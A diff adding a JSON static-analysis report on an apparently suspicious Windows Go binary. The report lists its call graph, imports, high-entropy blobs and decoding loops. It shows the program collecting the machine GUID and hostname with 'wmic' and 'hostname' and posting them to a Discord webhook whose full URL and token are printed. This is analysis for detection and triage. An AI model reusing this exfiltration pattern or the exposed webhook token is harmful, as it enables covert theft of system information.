@@ -1,0 +1,1018 @@
+{
+  "call_graph": {
+    "main.main": [
+      {
+        "address": "0x6493d1",
+        "target": "main.getWindowsGUID",
+        "target_address": "0x648f80",
+        "kind": "user",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "main.getWindowsGUID"
+      },
+      {
+        "address": "0x649490",
+        "target": "os.Exit",
+        "target_address": "0x4be7e0",
+        "kind": "std",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "os.Exit"
+      },
+      {
+        "address": "0x6494a5",
+        "target": "main.getComputerName",
+        "target_address": "0x6490e0",
+        "kind": "user",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "main.getComputerName"
+      },
+      {
+        "address": "0x64960f",
+        "target": "os.Exit",
+        "target_address": "0x4be7e0",
+        "kind": "std",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "os.Exit"
+      },
+      {
+        "address": "0x649a2a",
+        "target": "main.SendToDiscord",
+        "target_address": "0x649200",
+        "kind": "user",
+        "string_args": [
+          "https://discord.com/api/webhooks/1219334162096455803/PfouPEyl34XHeXsfIh-2lxZi9UYYvGbFt06jYcl6nZCWfgiS5t7wkdr9OV8i0EurFWA9"
+        ],
+        "arg_registers": {
+          "RAX/RBX": "https://discord.com/api/webhooks/1219334162096455803/PfouPEyl34XHeXsfIh-2lxZi9UYYvGbFt06jYcl6nZCWfgiS5t7wkdr9OV8i0EurFWA9"
+        },
+        "via": null,
+        "display": "main.SendToDiscord(\"https://discord.com/api/webhooks/1219334162096455803/PfouPEyl34XHeXsfIh-2lxZi9UYYvGbFt06jYcl6nZCWfgiS5t7wkdr9OV8i0EurFWA9\")"
+      }
+    ],
+    "main.getWindowsGUID": [
+      {
+        "address": "0x649002",
+        "target": "os/exec.Command",
+        "target_address": "0x644200",
+        "kind": "std",
+        "string_args": [
+          "wmic"
+        ],
+        "arg_registers": {
+          "RAX/RBX": "wmic"
+        },
+        "via": null,
+        "display": "os/exec.Command(\"wmic\")"
+      },
+      {
+        "address": "0x649051",
+        "target": "os/exec.(*Cmd).Run",
+        "target_address": "0x645640",
+        "kind": "std",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "os/exec.(*Cmd).Run"
+      },
+      {
+        "address": "0x6490a2",
+        "target": "strings.TrimSpace",
+        "target_address": "0x4cfda0",
+        "kind": "std",
+        "string_args": [
+          "<nil>"
+        ],
+        "arg_registers": {
+          "RAX/RBX": "<nil>",
+          "RAX": "<nil>"
+        },
+        "via": null,
+        "display": "strings.TrimSpace(\"<nil>\")"
+      }
+    ],
+    "main.getComputerName": [
+      {
+        "address": "0x64910b",
+        "target": "os/exec.Command",
+        "target_address": "0x644200",
+        "kind": "std",
+        "string_args": [
+          "hostname"
+        ],
+        "arg_registers": {
+          "RAX/RBX": "hostname"
+        },
+        "via": null,
+        "display": "os/exec.Command(\"hostname\")"
+      },
+      {
+        "address": "0x649160",
+        "target": "os/exec.(*Cmd).Run",
+        "target_address": "0x645640",
+        "kind": "std",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "os/exec.(*Cmd).Run"
+      },
+      {
+        "address": "0x6491b3",
+        "target": "strings.TrimSpace",
+        "target_address": "0x4cfda0",
+        "kind": "std",
+        "string_args": [
+          "<nil>"
+        ],
+        "arg_registers": {
+          "RAX/RBX": "<nil>",
+          "RAX": "<nil>"
+        },
+        "via": null,
+        "display": "strings.TrimSpace(\"<nil>\")"
+      }
+    ],
+    "main.SendToDiscord": [
+      {
+        "address": "0x64924f",
+        "target": "encoding/json.Marshal",
+        "target_address": "0x4d1320",
+        "kind": "std",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "encoding/json.Marshal"
+      },
+      {
+        "address": "0x6492e6",
+        "target": "net/http.(*Client).Post",
+        "target_address": "0x606280",
+        "kind": "std",
+        "string_args": [],
+        "arg_registers": {},
+        "via": null,
+        "display": "net/http.(*Client).Post"
+      }
+    ]
+  },
+  "semantic_analysis": {
+    "pe_imports": {
+      "kernel32.dll": [
+        "AddVectoredExceptionHandler",
+        "CloseHandle",
+        "CreateEventA",
+        "CreateFileA",
+        "CreateIoCompletionPort",
+        "CreateThread",
+        "CreateWaitableTimerExW",
+        "DuplicateHandle",
+        "ExitProcess",
+        "FreeEnvironmentStringsW",
+        "GetConsoleMode",
+        "GetEnvironmentStringsW",
+        "GetProcAddress",
+        "GetProcessAffinityMask",
+        "GetQueuedCompletionStatusEx",
+        "GetStdHandle",
+        "GetSystemDirectoryA",
+        "GetSystemInfo",
+        "GetThreadContext",
+        "LoadLibraryA",
+        "LoadLibraryW",
+        "PostQueuedCompletionStatus",
+        "ResumeThread",
+        "SetConsoleCtrlHandler",
+        "SetErrorMode",
+        "SetEvent",
+        "SetProcessPriorityBoost",
+        "SetThreadContext",
+        "SetUnhandledExceptionFilter",
+        "SetWaitableTimer",
+        "SuspendThread",
+        "SwitchToThread",
+        "TlsAlloc",
+        "VirtualAlloc",
+        "VirtualFree",
+        "VirtualQuery",
+        "WaitForMultipleObjects",
+        "WaitForSingleObject",
+        "WriteConsoleW",
+        "WriteFile"
+      ]
+    },
+    "mid_function_control_transfers": [
+      {
+        "source_function": "main.main",
+        "instruction": "0x6494d3",
+        "mnemonic": "call",
+        "transfer_type": "call",
+        "target_address": "0x465cd0",
+        "target_function": "runtime.duffzero",
+        "target_kind": "std",
+        "target_offset": "0x150",
+        "is_internal_branch": false,
+        "classification": "go_runtime_duff_helper",
+        "display": "main.main:0x6494d3 call -> runtime.duffzero+0x150"
+      }
+    ],
+    "indirect_calls": [],
+    "suspicious_data_blobs": [
+      {
+        "id": "blob_0",
+        "section": ".data",
+        "va": "0x88a000",
+        "size": "0x2000",
+        "entropy": 7.995,
+        "sha256_prefix": "57a25f1601273bd8",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [],
+        "reasons": [
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_1",
+        "section": ".data",
+        "va": "0x895000",
+        "size": "0x1000",
+        "entropy": 7.51,
+        "sha256_prefix": "67aefc88230ab834",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [],
+        "reasons": [
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_2",
+        "section": ".data",
+        "va": "0x89b000",
+        "size": "0x3000",
+        "entropy": 7.955,
+        "sha256_prefix": "a23654592dc2e2c2",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [],
+        "reasons": [
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_3",
+        "section": ".data",
+        "va": "0x8ad000",
+        "size": "0x1000",
+        "entropy": 3.364,
+        "sha256_prefix": "8f4806e1dcff96a6",
+        "referenced_by": [
+          "main.SendToDiscord"
+        ],
+        "reference_count": 1,
+        "magic_offsets": [
+          {
+            "offset": "0x869",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x8a9",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x8c1",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x8c9",
+            "magic": "gzip"
+          }
+        ],
+        "reasons": [
+          "referenced_by_reachable_code",
+          "contains_magic_bytes"
+        ]
+      },
+      {
+        "id": "blob_4",
+        "section": ".rdata",
+        "va": "0x6cc000",
+        "size": "0x1000",
+        "entropy": 4.888,
+        "sha256_prefix": "3212ec2d30f5dfe9",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0xe8d",
+            "magic": "gzip"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes"
+        ]
+      },
+      {
+        "id": "blob_5",
+        "section": ".rdata",
+        "va": "0x6cf000",
+        "size": "0x16000",
+        "entropy": 7.961,
+        "sha256_prefix": "48ce8eadfd9bfd6f",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x8b6",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x9b6",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xf36",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xb4a",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xe2",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x76d",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xffc",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xfa5",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xd1f",
+            "magic": "MZ"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes",
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_6",
+        "section": ".rdata",
+        "va": "0x738000",
+        "size": "0x1000",
+        "entropy": 4.63,
+        "sha256_prefix": "8d52e498f13f1020",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x338",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes"
+        ]
+      },
+      {
+        "id": "blob_7",
+        "section": ".rdata",
+        "va": "0x7cc000",
+        "size": "0x1000",
+        "entropy": 4.522,
+        "sha256_prefix": "f2788a25f0fd20ac",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0xd03",
+            "magic": "gzip"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes"
+        ]
+      },
+      {
+        "id": "blob_8",
+        "section": ".rdata",
+        "va": "0x852000",
+        "size": "0x1000",
+        "entropy": 4.299,
+        "sha256_prefix": "dd4b0d37c9208191",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x1d8",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes"
+        ]
+      },
+      {
+        "id": "blob_9",
+        "section": ".rdata",
+        "va": "0x865000",
+        "size": "0x1000",
+        "entropy": 4.373,
+        "sha256_prefix": "4f238fcd2e1e9e98",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x5c8",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes"
+        ]
+      },
+      {
+        "id": "blob_10",
+        "section": "/19",
+        "va": "0x916000",
+        "size": "0x61f2f",
+        "entropy": 7.954,
+        "sha256_prefix": "3fee5697cb620530",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x9b9",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x93a",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x881",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x439",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x60d",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x77e",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x6f9",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x55d",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x633",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x5cf",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xfe8",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x1f7",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xdb1",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x58d",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x7c5",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x33a",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xb4b",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x79b",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xd68",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xb04",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xcf4",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xc38",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xe3d",
+            "magic": "MZ"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes",
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_11",
+        "section": "/32",
+        "va": "0x978000",
+        "size": "0x139eb",
+        "entropy": 7.917,
+        "sha256_prefix": "1b340947af51190a",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0xc7c",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x7c6",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xedd",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x6ee",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x720",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes",
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_12",
+        "section": "/65",
+        "va": "0x98d000",
+        "size": "0xa7000",
+        "entropy": 7.958,
+        "sha256_prefix": "2f079966ff44f0f5",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0xef2",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x450",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x839",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x9c1",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xc2e",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xe07",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x92",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x4fd",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xd16",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x54f",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x1c4",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xbcf",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x5fb",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x812",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x46d",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x9e1",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x9b9",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xad2",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x9c3",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x6a1",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x327",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xbb4",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xd63",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x5ce",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x9c7",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x840",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x9ba",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xf04",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xa19",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x602",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x20c",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x6a6",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x219",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x483",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xb6d",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x113",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xeb2",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xda",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x954",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x6e",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x805",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xbb2",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x429",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x3a9",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xa74",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x530",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xf48",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x567",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xf6c",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes",
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_13",
+        "section": "/78",
+        "va": "0xa35000",
+        "size": "0x81000",
+        "entropy": 7.951,
+        "sha256_prefix": "170ff73fe1a00063",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x491",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x1cd",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x60a",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x407",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x893",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xb16",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x210",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xf83",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x420",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xaf5",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xf6e",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x457",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x1e5",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x8d4",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x9cf",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x3a8",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xef0",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0xe6a",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x336",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x14f",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0x6b",
+            "magic": "MZ"
+          },
+          {
+            "offset": "0x63d",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x897",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xcee",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0xe5d",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xba0",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes",
+          "high_entropy"
+        ]
+      },
+      {
+        "id": "blob_14",
+        "section": "/90",
+        "va": "0xab7000",
+        "size": "0x20be6",
+        "entropy": 7.775,
+        "sha256_prefix": "7494e06b599f1273",
+        "referenced_by": [],
+        "reference_count": 0,
+        "magic_offsets": [
+          {
+            "offset": "0x347",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xd32",
+            "magic": "gzip"
+          },
+          {
+            "offset": "0x2a3",
+            "magic": "zlib"
+          },
+          {
+            "offset": "0xf21",
+            "magic": "zlib"
+          }
+        ],
+        "reasons": [
+          "contains_magic_bytes",
+          "high_entropy"
+        ]
+      }
+    ],
+    "data_transformers": [
+      {
+        "function": "main.getWindowsGUID",
+        "operations": [
+          "add",
+          "bytes_to_string",
+          "shift",
+          "sub",
+          "xor"
+        ],
+        "loop_indicators": {
+          "backward_jumps": 1,
+          "byte_memory_ops": 0
+        },
+        "input_sources": [],
+        "large_copies": [],
+        "confidence": "medium"
+      },
+      {
+        "function": "main.getComputerName",
+        "operations": [
+          "add",
+          "bytes_to_string",
+          "shift",
+          "sub",
+          "xor"
+        ],
+        "loop_indicators": {
+          "backward_jumps": 1,
+          "byte_memory_ops": 0
+        },
+        "input_sources": [],
+        "large_copies": [],
+        "confidence": "medium"
+      },
+      {
+        "function": "main.SendToDiscord",
+        "operations": [
+          "add",
+          "sub",
+          "xor"
+        ],
+        "loop_indicators": {
+          "backward_jumps": 1,
+          "byte_memory_ops": 0
+        },
+        "input_sources": [
+          "blob_3"
+        ],
+        "large_copies": [],
+        "confidence": "medium"
+      }
+    ],
+    "loader_behaviors": [],
+    "embedded_payloads": [],
+    "assessment_hints": [
+      "Reachable code references suspicious high-entropy or magic-containing data blobs.",
+      "Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime."
+    ]
+  }
+}
